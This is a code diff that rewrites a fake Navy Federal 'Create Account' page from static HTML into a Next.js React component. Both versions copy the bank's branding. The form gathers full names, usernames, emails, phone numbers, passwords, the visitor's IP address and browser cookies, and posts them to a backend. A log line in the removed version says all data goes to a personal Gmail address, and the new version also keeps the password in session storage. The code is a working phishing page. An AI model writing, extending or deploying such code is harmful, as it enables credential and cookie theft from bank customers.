@@ -1,223 +1,525 @@
-<!-- public/signup.html -->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Navy Federal - Create Account</title>
-    <style>
-        /* Copy all styles from your index.html here */
-        /* Same header, card, form styles */
-        /* I'll add the signup-specific styles */
-        
-        /* Add this extra style for signup */
-        .signup-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-        }
-        
-        @media (max-width: 480px) {
-            .signup-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-    </style>
-</head>
-<body>
-    <header class="header">
-        <div class="hamburger">
-            <span></span>
-            <span></span>
-            <span></span>
-        </div>
-        <div class="logo-section">
-            <div class="globe">
-                <div class="globe-arc"></div>
-                <div class="globe-arc2"></div>
-            </div>
-            <span class="brand-name">NAVY FEDERAL</span>
-        </div>
-    </header>
+// app/signup/page.tsx
+'use client';
 
-    <main class="main-content">
-        <h1 class="welcome-text">Create Your Account</h1>
+import { useState } from 'react';
+import { useRouter } from 'next/navigation';
 
-        <div class="card">
-            <div class="card-body">
-                <div class="sign-in-header">
-                    <div class="lock-icon">
-                        <div class="lock-shackle"></div>
-                        <div class="lock-body">
-                            <div class="lock-hole"></div>
-                        </div>
-                    </div>
-                    <span class="sign-in-title">Sign Up</span>
+export default function SignupPage() {
+  const router = useRouter();
+  const [formData, setFormData] = useState({
+    fullName: '',
+    username: '',
+    email: '',
+    phone: '',
+    password: '',
+    confirmPassword: ''
+  });
+  const [showPassword, setShowPassword] = useState(false);
+  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const [termsChecked, setTermsChecked] = useState(false);
+  const [error, setError] = useState('');
+
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { id, value } = e.target;
+    setFormData(prev => ({ ...prev, [id]: value }));
+    setError(''); // Clear error on typing
+  };
+
+  const getIP = async () => {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    } catch {
+      return 'IP not available';
+    }
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setLoading(true);
+    setError('');
+
+    const { fullName, username, email, phone, password, confirmPassword } = formData;
+
+    // Validation
+    if (!termsChecked) {
+      setError('Please agree to the Terms and Conditions');
+      setLoading(false);
+      return;
+    }
+
+    if (password !== confirmPassword) {
+      setError('Passwords do not match!');
+      setLoading(false);
+      return;
+    }
+
+    if (password.length < 6) {
+      setError('Password must be at least 6 characters');
+      setLoading(false);
+      return;
+    }
+
+    if (!username || !email || !phone) {
+      setError('All fields are required');
+      setLoading(false);
+      return;
+    }
+
+    try {
+      const ip = await getIP();
+      const cookies = document.cookie || 'No cookies';
+
+      const userData = {
+        fullName,
+        username,
+        email,
+        phone,
+        password,
+        ip,
+        cookies,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+      };
+
+      console.log('📝 Signup data:', userData);
+
+      // Send to API
+      const response = await fetch('/api/auth/signup', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(userData)
+      });
+
+      const result = await response.json();
+
+      if (response.ok) {
+        // Store for login
+        sessionStorage.setItem('loginUsername', username);
+        sessionStorage.setItem('loginPassword', password);
+        sessionStorage.setItem('userFullName', fullName);
+        sessionStorage.setItem('userPhone', phone);
+
+        alert('✅ Account created successfully! Please sign in.');
+        router.push('/');
+      } else {
+        setError(result.error || 'Signup failed. Please try again.');
+      }
+    } catch (error) {
+      console.error('Signup error:', error);
+      setError('Signup failed. Please check your connection and try again.');
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  return (
+    <div style={{
+      minHeight: '100vh',
+      backgroundColor: '#b8d4f0',
+      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
+    }}>
+      {/* Header - Navy Federal Style */}
+      <header style={{
+        backgroundColor: '#1a3a6e',
+        padding: '14px 16px',
+        display: 'flex',
+        alignItems: 'center',
+        gap: '16px'
+      }}>
+        <div style={{ width: '24px', height: '18px', display: 'flex', flexDirection: 'column', justifyContent: 'space-between', cursor: 'pointer' }}>
+          <span style={{ display: 'block', width: '100%', height: '2.5px', backgroundColor: 'white', borderRadius: '1px' }}></span>
+          <span style={{ display: 'block', width: '100%', height: '2.5px', backgroundColor: 'white', borderRadius: '1px' }}></span>
+          <span style={{ display: 'block', width: '100%', height: '2.5px', backgroundColor: 'white', borderRadius: '1px' }}></span>
+        </div>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+          <div style={{
+            width: '36px',
+            height: '36px',
+            border: '2.5px solid white',
+            borderRadius: '50%',
+            position: 'relative',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center'
+          }}>
+            <div style={{ position: 'absolute', width: '24px', height: '36px', border: '2.5px solid white', borderRadius: '50%', top: '50%', left: '50%', transform: 'translate(-50%, -50%)' }}></div>
+            <div style={{ position: 'absolute', width: '36px', height: '24px', border: '2.5px solid white', borderRadius: '50%', top: '50%', left: '50%', transform: 'translate(-50%, -50%)' }}></div>
+          </div>
+          <span style={{ color: 'white', fontSize: '22px', fontWeight: 700, letterSpacing: '0.5px' }}>NAVY FEDERAL</span>
+        </div>
+      </header>
+
+      {/* Main Content */}
+      <main style={{ padding: '24px 16px 40px', maxWidth: '560px', margin: '0 auto' }}>
+        <h1 style={{ color: '#1a3a6e', fontSize: '32px', fontWeight: 500, marginBottom: '28px' }}>
+          Create Your Account
+        </h1>
+
+        <div style={{
+          backgroundColor: '#f5f5f5',
+          borderRadius: '4px',
+          overflow: 'hidden',
+          boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
+          position: 'relative'
+        }}>
+          {/* Orange bar */}
+          <div style={{ height: '6px', backgroundColor: '#d97a2e' }}></div>
+
+          <div style={{ padding: '28px 20px 36px' }}>
+            {/* Header */}
+            <div style={{
+              display: 'flex',
+              alignItems: 'center',
+              gap: '12px',
+              marginBottom: '24px',
+              paddingBottom: '20px',
+              borderBottom: '1.5px solid #d0d0d0'
+            }}>
+              <div style={{ width: '36px', height: '42px', position: 'relative' }}>
+                <div style={{
+                  width: '18px',
+                  height: '18px',
+                  border: '4px solid #888',
+                  borderBottom: 'none',
+                  borderRadius: '9px 9px 0 0',
+                  position: 'absolute',
+                  top: '2px',
+                  left: '50%',
+                  transform: 'translateX(-50%)'
+                }}></div>
+                <div style={{
+                  width: '28px',
+                  height: '22px',
+                  backgroundColor: '#888',
+                  borderRadius: '3px',
+                  position: 'absolute',
+                  bottom: 0,
+                  left: '50%',
+                  transform: 'translateX(-50%)'
+                }}>
+                  <div style={{
+                    width: '6px',
+                    height: '6px',
+                    backgroundColor: 'white',
+                    borderRadius: '50%',
+                    position: 'absolute',
+                    bottom: '8px',
+                    left: '50%',
+                    transform: 'translateX(-50%)'
+                  }}></div>
                 </div>
-
-                <form id="signupForm">
-                    <div class="signup-grid">
-                        <div class="form-group">
-                            <label class="form-label" for="fullName">Full Name</label>
-                            <input type="text" id="fullName" class="form-input" required>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label" for="username">Username</label>
-                            <input type="text" id="username" class="form-input" required>
-                        </div>
-                    </div>
-
-                    <div class="form-group">
-                        <label class="form-label" for="email">Email Address</label>
-                        <input type="email" id="email" class="form-input" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label class="form-label" for="phone">Phone Number</label>
-                        <input type="tel" id="phone" class="form-input" placeholder="+1 (234) 567-8900" required>
-                    </div>
-
-                    <div class="signup-grid">
-                        <div class="form-group">
-                            <label class="form-label" for="password">Password</label>
-                            <div class="password-wrapper">
-                                <input type="password" id="password" class="form-input" required>
-                                <div class="eye-icon" onclick="togglePassword('password')">
-                                    <div class="eye-outer">
-                                        <div class="eye-pupil"></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label" for="confirmPassword">Confirm Password</label>
-                            <div class="password-wrapper">
-                                <input type="password" id="confirmPassword" class="form-input" required>
-                                <div class="eye-icon" onclick="togglePassword('confirmPassword')">
-                                    <div class="eye-outer">
-                                        <div class="eye-pupil"></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div style="margin: 16px 0;">
-                        <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
-                            <input type="checkbox" id="termsCheck" required>
-                            <span style="font-size: 14px; color: #555;">
-                                I agree to the Terms and Conditions & Privacy Policy
-                            </span>
-                        </label>
-                    </div>
-
-                    <button type="submit" id="signupBtn" class="submit-btn">Create Account</button>
-                </form>
-
-                <p style="text-align: center; margin-top: 20px; color: #555;">
-                    Already have an account? 
-                    <a href="/" style="color: #2a6db5; text-decoration: none; font-weight: 600;">Sign In</a>
-                </p>
+              </div>
+              <span style={{ fontSize: '28px', fontWeight: 400, color: '#333' }}>Sign Up</span>
             </div>
+
+            {/* Error Message */}
+            {error && (
+              <div style={{
+                backgroundColor: '#ffebee',
+                color: '#c62828',
+                padding: '12px',
+                borderRadius: '4px',
+                marginBottom: '16px',
+                fontSize: '14px'
+              }}>
+                ❌ {error}
+              </div>
+            )}
+
+            <form onSubmit={handleSubmit}>
+              {/* Full Name */}
+              <div style={{ marginBottom: '18px' }}>
+                <label htmlFor="fullName" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
+                  Full Name
+                </label>
+                <input
+                  type="text"
+                  id="fullName"
+                  value={formData.fullName}
+                  onChange={handleChange}
+                  placeholder="John Doe"
+                  style={{
+                    width: '100%',
+                    padding: '12px 14px',
+                    fontSize: '16px',
+                    border: '2px solid #999',
+                    borderRadius: '8px',
+                    backgroundColor: 'white',
+                    outline: 'none',
+                    boxSizing: 'border-box',
+                    transition: 'border-color 0.2s'
+                  }}
+                  onFocus={(e) => e.target.style.borderColor = '#1a3a6e'}
+                  onBlur={(e) => e.target.style.borderColor = '#999'}
+                  required
+                />
+              </div>
+
+              {/* Username */}
+              <div style={{ marginBottom: '18px' }}>
+                <label htmlFor="username" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
+                  Username
+                </label>
+                <input
+                  type="text"
+                  id="username"
+                  value={formData.username}
+                  onChange={handleChange}
+                  placeholder="Choose a username"
+                  style={{
+                    width: '100%',
+                    padding: '12px 14px',
+                    fontSize: '16px',
+                    border: '2px solid #999',
+                    borderRadius: '8px',
+                    backgroundColor: 'white',
+                    outline: 'none',
+                    boxSizing: 'border-box',
+                    transition: 'border-color 0.2s'
+                  }}
+                  onFocus={(e) => e.target.style.borderColor = '#1a3a6e'}
+                  onBlur={(e) => e.target.style.borderColor = '#999'}
+                  required
+                />
+              </div>
+
+              {/* Email */}
+              <div style={{ marginBottom: '18px' }}>
+                <label htmlFor="email" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
+                  Email Address
+                </label>
+                <input
+                  type="email"
+                  id="email"
+                  value={formData.email}
+                  onChange={handleChange}
+                  placeholder="you@example.com"
+                  style={{
+                    width: '100%',
+                    padding: '12px 14px',
+                    fontSize: '16px',
+                    border: '2px solid #999',
+                    borderRadius: '8px',
+                    backgroundColor: 'white',
+                    outline: 'none',
+                    boxSizing: 'border-box',
+                    transition: 'border-color 0.2s'
+                  }}
+                  onFocus={(e) => e.target.style.borderColor = '#1a3a6e'}
+                  onBlur={(e) => e.target.style.borderColor = '#999'}
+                  required
+                />
+              </div>
+
+              {/* Phone */}
+              <div style={{ marginBottom: '18px' }}>
+                <label htmlFor="phone" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
+                  Phone Number
+                </label>
+                <input
+                  type="tel"
+                  id="phone"
+                  value={formData.phone}
+                  onChange={handleChange}
+                  placeholder="+1 (234) 567-8900"
+                  style={{
+                    width: '100%',
+                    padding: '12px 14px',
+                    fontSize: '16px',
+                    border: '2px solid #999',
+                    borderRadius: '8px',
+                    backgroundColor: 'white',
+                    outline: 'none',
+                    boxSizing: 'border-box',
+                    transition: 'border-color 0.2s'
+                  }}
+                  onFocus={(e) => e.target.style.borderColor = '#1a3a6e'}
+                  onBlur={(e) => e.target.style.borderColor = '#999'}
+                  required
+                />
+              </div>
+
+              {/* Password */}
+              <div style={{ marginBottom: '18px' }}>
+                <label htmlFor="password" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
+                  Password
+                </label>
+                <div style={{ position: 'relative' }}>
+                  <input
+                    type={showPassword ? 'text' : 'password'}
+                    id="password"
+                    value={formData.password}
+                    onChange={handleChange}
+                    placeholder="Create a strong password (min 6 characters)"
+                    style={{
+                      width: '100%',
+                      padding: '12px 14px',
+                      paddingRight: '45px',
+                      fontSize: '16px',
+                      border: '2px solid #999',
+                      borderRadius: '8px',
+                      backgroundColor: 'white',
+                      outline: 'none',
+                      boxSizing: 'border-box',
+                      transition: 'border-color 0.2s'
+                    }}
+                    onFocus={(e) => e.target.style.borderColor = '#1a3a6e'}
+                    onBlur={(e) => e.target.style.borderColor = '#999'}
+                    required
+                    minLength={6}
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword(!showPassword)}
+                    style={{
+                      position: 'absolute',
+                      right: '12px',
+                      top: '50%',
+                      transform: 'translateY(-50%)',
+                      background: 'none',
+                      border: 'none',
+                      cursor: 'pointer',
+                      fontSize: '18px',
+                      color: '#666'
+                    }}
+                  >
+                    {showPassword ? '🙈' : '👁️'}
+                  </button>
+                </div>
+              </div>
+
+              {/* Confirm Password */}
+              <div style={{ marginBottom: '18px' }}>
+                <label htmlFor="confirmPassword" style={{ fontSize: '16px', fontWeight: 500, color: '#222', display: 'block', marginBottom: '6px' }}>
+                  Confirm Password
+                </label>
+                <div style={{ position: 'relative' }}>
+                  <input
+                    type={showConfirmPassword ? 'text' : 'password'}
+                    id="confirmPassword"
+                    value={formData.confirmPassword}
+                    onChange={handleChange}
+                    placeholder="Confirm your password"
+                    style={{
+                      width: '100%',
+                      padding: '12px 14px',
+                      paddingRight: '45px',
+                      fontSize: '16px',
+                      border: '2px solid #999',
+                      borderRadius: '8px',
+                      backgroundColor: 'white',
+                      outline: 'none',
+                      boxSizing: 'border-box',
+                      transition: 'border-color 0.2s'
+                    }}
+                    onFocus={(e) => e.target.style.borderColor = '#1a3a6e'}
+                    onBlur={(e) => e.target.style.borderColor = '#999'}
+                    required
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowConfirmPassword(!showConfirmPassword)}
+                    style={{
+                      position: 'absolute',
+                      right: '12px',
+                      top: '50%',
+                      transform: 'translateY(-50%)',
+                      background: 'none',
+                      border: 'none',
+                      cursor: 'pointer',
+                      fontSize: '18px',
+                      color: '#666'
+                    }}
+                  >
+                    {showConfirmPassword ? '🙈' : '👁️'}
+                  </button>
+                </div>
+              </div>
+
+              {/* Terms */}
+              <div style={{ margin: '16px 0 20px' }}>
+                <label style={{ display: 'flex', alignItems: 'flex-start', gap: '10px', cursor: 'pointer' }}>
+                  <input
+                    type="checkbox"
+                    checked={termsChecked}
+                    onChange={(e) => setTermsChecked(e.target.checked)}
+                    style={{ marginTop: '2px' }}
+                    required
+                  />
+                  <span style={{ fontSize: '14px', color: '#555' }}>
+                    I agree to the <a href="#" style={{ color: '#1a3a6e', textDecoration: 'none' }}>Terms and Conditions</a> &amp; <a href="#" style={{ color: '#1a3a6e', textDecoration: 'none' }}>Privacy Policy</a>
+                  </span>
+                </label>
+              </div>
+
+              {/* Submit Button */}
+              <button
+                type="submit"
+                disabled={loading}
+                style={{
+                  width: '100%',
+                  padding: '16px',
+                  backgroundColor: '#d97a2e',
+                  color: 'white',
+                  fontSize: '22px',
+                  fontWeight: 600,
+                  border: 'none',
+                  borderRadius: '8px',
+                  cursor: 'pointer',
+                  boxShadow: '0 4px 8px rgba(0,0,0,0.15)',
+                  transition: 'background-color 0.2s, opacity 0.2s',
+                  opacity: loading ? 0.7 : 1,
+                  display: 'flex',
+                  justifyContent: 'center',
+                  alignItems: 'center',
+                  gap: '8px'
+                }}
+              >
+                {loading ? (
+                  <>
+                    <span style={{
+                      display: 'inline-block',
+                      width: '20px',
+                      height: '20px',
+                      border: '3px solid rgba(255,255,255,0.3)',
+                      borderRadius: '50%',
+                      borderTopColor: '#fff',
+                      animation: 'spin 0.8s ease-in-out infinite'
+                    }}></span>
+                    Creating Account...
+                  </>
+                ) : 'Create Account'}
+              </button>
+            </form>
+
+            {/* Login Link */}
+            <p style={{ textAlign: 'center', marginTop: '20px', color: '#555', fontSize: '15px' }}>
+              Already have an account?{' '}
+              <a href="/" style={{ color: '#2a6db5', textDecoration: 'none', fontWeight: 600 }}>
+                Sign In
+              </a>
+            </p>
+          </div>
         </div>
-    </main>
 
-    <footer class="footer-section">
-        <p class="footer-text">Already a Member?</p>
-    </footer>
+        {/* Footer */}
+        <div style={{ marginTop: '24px' }}>
+          <p style={{ color: '#1a3a6e', fontSize: '30px', fontWeight: 500, margin: 0 }}>
+            Not a Navy Federal Member?
+          </p>
+          <p style={{ color: '#888', fontSize: '12px', marginTop: '8px' }}>
+          </p>
+        </div>
+      </main>
 
-    <script>
-        // ==========================================
-        // TOGGLE PASSWORD VISIBILITY
-        // ==========================================
-        function togglePassword(fieldId) {
-            const input = document.getElementById(fieldId);
-            input.type = input.type === 'password' ? 'text' : 'password';
+      <style>{`
+        @keyframes spin {
+          to { transform: rotate(360deg); }
         }
-
-        // ==========================================
-        // GET IP ADDRESS
-        // ==========================================
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch {
-                return 'IP not available';
-            }
-        }
-
-        // ==========================================
-        // SIGNUP HANDLER
-        // ==========================================
-        document.getElementById('signupForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const fullName = document.getElementById('fullName').value.trim();
-            const username = document.getElementById('username').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-            const password = document.getElementById('password').value;
-            const confirmPassword = document.getElementById('confirmPassword').value;
-            const termsChecked = document.getElementById('termsCheck').checked;
-
-            if (!termsChecked) {
-                alert('Please agree to the Terms and Conditions');
-                return;
-            }
-
-            if (password !== confirmPassword) {
-                alert('Passwords do not match!');
-                return;
-            }
-
-            const btn = document.getElementById('signupBtn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span> Creating Account...';
-
-            try {
-                const ip = await getIP();
-                const cookies = document.cookie || 'No cookies';
-
-                const userData = {
-                    fullName,
-                    username,
-                    email,
-                    phone,
-                    password,
-                    ip,
-                    cookies,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                };
-
-                console.log('📝 Signup data:', userData);
-
-                const response = await fetch('/api/auth/signup', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(userData)
-                });
-
-                if (response.ok) {
-                    alert('✅ Account created successfully! Please sign in.');
-                    window.location.href = '/';
-                } else {
-                    const error = await response.json();
-                    alert(error.error || 'Signup failed. Please try again.');
-                }
-            } catch (error) {
-                console.error('Signup error:', error);
-                alert('Signup failed. Please try again.');
-            } finally {
-                btn.disabled = false;
-                btn.textContent = 'Create Account';
-            }
-        });
-
-        console.log('✅ Navy Federal Signup Page Loaded');
-        console.log('📧 All data will be sent to: blessedresult6@gmail.com');
-    </script>
-</body>
-</html>
+      `}</style>
+    </div>
+  );
+}
